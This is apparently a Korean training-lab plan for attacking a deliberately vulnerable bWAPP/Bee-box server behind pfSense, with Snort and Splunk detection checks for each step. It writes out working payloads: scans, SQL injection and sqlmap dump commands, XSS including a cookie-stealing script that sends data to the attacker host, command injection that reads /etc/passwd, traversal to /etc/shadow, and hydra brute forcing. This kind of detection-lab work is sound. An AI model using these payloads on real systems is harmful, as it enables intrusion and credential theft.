# Phase 1. 공격 수행

> att-mint(10.50.50.17) → pfSense NAT → Bee-box(10.0.10.50)

---

## 사전 준비

### 도구 설치 (att-mint)

```bash
sudo apt update
sudo apt install -y nmap nikto dirb hydra curl
# sqlmap
sudo apt install -y sqlmap
```

### 접속 확인

```bash
# pfSense NAT를 통해 Bee-box 웹서버 접근
curl -I http://10.0.0.254

# 직접 접근 (DMZ 내부 경로)
ping 10.0.10.50
```

### bWAPP 설정

1. http://10.0.0.254/bWAPP/ 접속
2. bee / bug 로그인
3. Security Level → **low** 설정

---

## 정찰 단계 (Reconnaissance)

### R-1. TCP 포트 스캔

```bash
nmap -sS -p 1-1000 10.0.0.254 -oN scan_tcp.txt
```

- 목적: 열린 포트/서비스 파악
- 예상 결과: 80/tcp open (HTTP)
- Snort 예상 탐지: sfPortscan

**결과:**
> (실습 후 결과 기록)

### R-2. 서비스 버전 탐지

```bash
nmap -sV -O 10.0.0.254 -oN scan_version.txt
```

- 목적: OS, 웹서버 버전 식별
- 예상 결과: Apache, PHP 버전 등

**결과:**
> (실습 후 결과 기록)

### R-3. 웹 취약점 스캔

```bash
nikto -h http://10.0.0.254 -o nikto_result.txt
```

- 목적: 웹서버 취약점 자동 탐색
- Snort 예상 탐지: ET SCAN Nikto Web App Scanner

**결과:**
> (실습 후 결과 기록)

### R-4. 디렉토리 브루트포스

```bash
dirb http://10.0.0.254 -o dirb_result.txt
```

- 목적: 숨겨진 경로/파일 탐색

**결과:**
> (실습 후 결과 기록)

---

## 웹 공격 단계 (Exploitation)

### E-1. SQL Injection (수동)

**bWAPP 메뉴:** SQL Injection (GET/Search)

```
# 인증 우회
' OR 1=1--

# 데이터 추출
' UNION SELECT 1,login,password,4,5,6,7 FROM users--
```

- Snort 예상 탐지: ET WEB_SERVER SQL Injection Attempt

**결과:**
> (실습 후 결과 기록)

### E-2. SQL Injection (sqlmap 자동화)

```bash
# DB 목록 추출
sqlmap -u "http://10.0.0.254/bWAPP/sqli_1.php?title=test&action=search" \
  --cookie="PHPSESSID=<세션값>;security_level=0" \
  --dbs

# 테이블 추출
sqlmap -u "..." --cookie="..." -D bWAPP --tables

# 데이터 덤프
sqlmap -u "..." --cookie="..." -D bWAPP -T users --dump
```

- Snort 예상 탐지: ET WEB_SERVER sqlmap User Agent

**결과:**
> (실습 후 결과 기록)

### E-3. Reflected XSS

**bWAPP 메뉴:** XSS - Reflected (GET)

```html
<script>alert('XSS')</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert('XSS')>
```

- Snort 예상 탐지: ET WEB_SERVER XSS Attempt

**결과:**
> (실습 후 결과 기록)

### E-4. Stored XSS

**bWAPP 메뉴:** XSS - Stored (Blog)

```html
<script>document.location='http://10.50.50.17/steal?c='+document.cookie</script>
```

- 게시글에 저장되어 다른 사용자 접속 시 실행됨

**결과:**
> (실습 후 결과 기록)

### E-5. OS Command Injection

**bWAPP 메뉴:** OS Command Injection

```bash
; whoami
; cat /etc/passwd
; ls -la /
; uname -a
; netstat -an
```

- Snort 예상 탐지: ET WEB_SERVER Command Injection

**결과:**
> (실습 후 결과 기록)

### E-6. Directory Traversal

**bWAPP 메뉴:** Directory Traversal - Files

```
../../../etc/passwd
../../../etc/shadow
```

**결과:**
> (실습 후 결과 기록)

### E-7. Brute Force (hydra)

```bash
# 워드리스트 생성
echo -e "admin\npassword\n123456\nbee\nbug\ntest\nroot" > wordlist.txt

# HTTP POST 브루트포스
hydra -l bee -P wordlist.txt 10.0.0.254 \
  http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid"
```

**결과:**
> (실습 후 결과 기록)

---

## 공격 타임라인 (계획)

| 시각 | 공격 | 비고 |
|------|------|------|
| 00:00-00:15 | R-1~R-4 정찰 | 스캔성 트래픽 |
| 00:20-00:40 | E-1~E-2 SQL Injection | DB 공격 |
| 00:45-01:00 | E-3~E-4 XSS | 클라이언트 공격 |
| 01:05-01:15 | E-5 Command Injection | 서버 장악 시도 |
| 01:20-01:30 | E-6~E-7 Traversal + Brute Force | 정보수집 + 인증공격 |

> 각 공격을 15~20분 간격으로 수행하여 Splunk 타임라인에서 공격 유형별로 명확히 구분

---

## 실제 수행 시각 기록표

> Splunk 타임차트(`timechart count by signature`)와 1:1 대조하기 위해, 각 공격을 실행한 **실제 시각(KST)** 을 실습 중에 즉시 기록한다.
> 시각 기준을 att-mint · pfSense · Splunk 서버가 동일하게 맞추도록 실습 전 NTP/시간 동기화를 먼저 확인한다.

| 단계 | 공격 | 실제 수행 시각 (KST, HH:MM:SS) | 출발지 IP | 대상 | Splunk 확인 | Snort 탐지 |
|------|------|------------------------------|-----------|------|-------------|-----------|
| R-1 | TCP 포트 스캔 | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| R-2 | 서비스 버전 탐지 | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| R-3 | 웹 취약점 스캔 (nikto) | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| R-4 | 디렉토리 브루트포스 (dirb) | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-1 | SQL Injection (수동) | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-2 | SQL Injection (sqlmap) | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-3 | Reflected XSS | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-4 | Stored XSS | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-5 | OS Command Injection | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-6 | Directory Traversal | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |
| E-7 | Brute Force (hydra) | | 10.50.50.17 | 10.0.0.254 | ☐ | ☐ |

---

## 실습 정리 (Cleanup)

> 반복 실습 시 이전 흔적이 결과를 오염시키지 않도록, 한 사이클이 끝나면 아래를 정리한다.
> **주의:** 정리 작업 자체는 Splunk에 기록된 로그(index=pfsense)를 지우지 않는다 — 분석용 원본 로그는 보존한다.

- [ ] **Stored XSS 페이로드 삭제** — bWAPP Blog에 저장한 `<script>` 게시글 제거 (E-4)
- [ ] **att-mint 산출물 정리** — `scan_*.txt`, `nikto_result.txt`, `dirb_result.txt`, `wordlist.txt`, sqlmap 세션·덤프(`~/.local/share/sqlmap/` 또는 `~/.sqlmap/output/`) 백업 후 삭제
- [ ] **bWAPP 상태 초기화** — 필요 시 bWAPP `/reset` 또는 DB 재초기화로 변조 데이터 원복
- [ ] **방화벽/Snort 임시 규칙 원복** — Phase 2·3에서 넣은 차단 규칙·Snort 차단 목록(Blocked)을 다음 실습 전 초기 상태로 되돌림
- [ ] **시각 기록 저장** — 위 "실제 수행 시각 기록표"를 사이클별로 별도 보관 (덮어쓰기 방지)
